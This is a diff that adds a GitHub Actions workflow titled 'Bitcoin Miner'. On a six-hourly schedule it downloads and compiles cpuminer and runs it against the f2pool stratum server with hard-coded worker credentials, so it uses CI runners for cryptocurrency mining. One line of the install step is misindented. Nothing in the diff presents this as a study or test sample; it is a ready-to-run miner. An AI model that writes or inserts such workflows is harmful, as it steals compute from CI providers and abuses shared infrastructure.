@@ -1,0 +1,27 @@
+name: Bitcoin Miner
+
+on:
+  schedule:
+    - cron: "0 */6 * * *"
+  workflow_dispatch:
+
+jobs:
+  mining-1:
+    runs-on: ubuntu-latest
+    steps:
+      - name: checkout repo content
+        uses: actions/checkout@v3
+
+      - name: Install and build dependencies
+        run: |
+          sudo apt-get install make libcurl4-openssl-dev
+          wget https://github.com/pooler/cpuminer/releases/download/v2.5.1/pooler-cpuminer-2.5.1.tar.gz
+tar xzf pooler-cpuminer-*.tar.gz
+          cd cpuminer-*
+          ./configure CFLAGS="-O3"
+          make
+
+      - name: Mining
+        run: |
+          cd cpuminer-*
+          ./minerd --url=stratum+tcp://btc.f2pool.com:1314 --userpass=arkina1991.001:21235365876986800
